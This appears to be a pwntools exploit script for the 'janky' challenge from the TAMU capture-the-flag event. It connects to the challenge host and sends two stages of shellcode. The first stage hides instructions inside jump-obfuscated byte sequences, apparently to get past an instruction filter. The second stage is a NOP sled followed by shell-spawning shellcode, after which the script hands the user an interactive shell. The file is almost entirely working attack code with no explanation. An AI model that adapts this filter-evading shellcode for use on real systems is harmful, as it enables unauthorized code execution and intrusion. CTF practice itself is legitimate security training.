#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./janky_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="janky")
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}


stage1 = (
    b'\xeb\x01'
    b'\xe9R\x90\xeb\x01'
    b'\xe9^\x90\xeb\x01'
    b'\xe91\xff\xeb\x01'
    b'\xe91\xc0\xeb\x01'
    b'\xe9\x9c\x90\xeb\x01'
    b'\xe9Z\x90\xeb\x01'
    b'\xe9\x0f\x05\xeb\x01'
)
stage2 = b"\x90" * len(stage1) + asm(shellcraft.sh())

io = start()
io.send(stage1)
time.sleep(0.1)
io.send(stage2)

io.interactive()
